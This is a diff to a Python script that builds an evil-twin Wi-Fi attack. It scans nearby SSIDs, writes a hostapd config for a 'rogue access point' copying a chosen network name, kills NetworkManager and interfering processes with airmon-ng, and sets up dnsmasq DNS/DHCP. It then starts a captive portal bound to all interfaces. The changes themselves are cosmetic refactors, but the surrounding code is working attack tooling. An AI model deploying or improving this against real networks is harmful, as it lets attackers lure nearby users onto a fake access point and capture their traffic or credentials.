@@ -15,10 +15,10 @@ def list_wifi_adapters():
             if "IEEE 802.11" in line:
                 adapter = line.split()[0]
                 adapters.append(adapter)
-        
+
         if not adapters:
             raise Exception("No Wi-Fi adapters found. Ensure your Wi-Fi adapter is connected and recognized.")
-        
+
         return adapters
     except Exception as e:
         print(f"[!] Error listing Wi-Fi adapters: {e}")
@@ -31,13 +31,13 @@ def scan_wifi(adapter):
         result = subprocess.run(["nmcli", "-f", "SSID", "dev", "wifi"], capture_output=True, text=True)
         if result.returncode != 0:
             raise Exception("Failed to scan Wi-Fi networks. Ensure 'nmcli' is installed and your Wi-Fi adapter is functioning.")
-        
+
         networks = result.stdout.splitlines()[1:]  # Skip the header line
         networks = [net.strip() for net in networks if net.strip()]  # Remove empty lines
-        
+
         if not networks:
             raise Exception("No Wi-Fi networks found. Ensure your Wi-Fi adapter is functioning properly.")
-        
+
         return networks
     except Exception as e:
         print(f"[!] Error during Wi-Fi scan: {e}")
@@ -47,7 +47,8 @@ def scan_wifi(adapter):
 def setup_rogue_ap(adapter, ssid):
     try:
         print(f"[*] Setting up rogue access point for SSID: {ssid} on {adapter}...")
-        with open("/etc/hostapd/hostapd.conf", "w") as f:
+        hostapd_config = "/etc/hostapd/hostapd.conf"
+        with open(hostapd_config, "w") as f:
             f.write(f"interface={adapter}\n")
             f.write(f"driver=nl80211\n")
             f.write(f"ssid={ssid}\n")
@@ -62,7 +63,7 @@ def setup_rogue_ap(adapter, ssid):
         # Stop NetworkManager to avoid conflicts
         subprocess.run(["systemctl", "stop", "NetworkManager"], check=True)
         subprocess.run(["airmon-ng", "check", "kill"], check=True)
-        subprocess.run(["hostapd", "/etc/hostapd/hostapd.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+        subprocess.run(["hostapd", hostapd_config], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
     except subprocess.CalledProcessError as e:
         print(f"[!] Error setting up rogue access point: {e}")
         exit(1)
@@ -74,7 +75,8 @@ def setup_rogue_ap(adapter, ssid):
 def setup_dns_dhcp(adapter):
     try:
         print("[*] Setting up DNS and DHCP...")
-        with open("/etc/dnsmasq.conf", "w") as f:
+        dnsmasq_config = "/etc/dnsmasq.conf"
+        with open(dnsmasq_config, "w") as f:
             f.write(f"interface={adapter}\n")
             f.write("dhcp-range=192.168.1.10,192.168.1.100,12h\n")
             f.write("dhcp-option=3,192.168.1.1\n")
@@ -152,7 +154,7 @@ def main():
 
         # Step 7: Start the captive portal
         print("[*] Starting captive portal...")
-        app.run(host="192.168.1.1", port=80)
+        app.run(host="0.0.0.0", port=80)
 
     except KeyboardInterrupt:
         print("\n[*] Script interrupted by user. Exiting.")
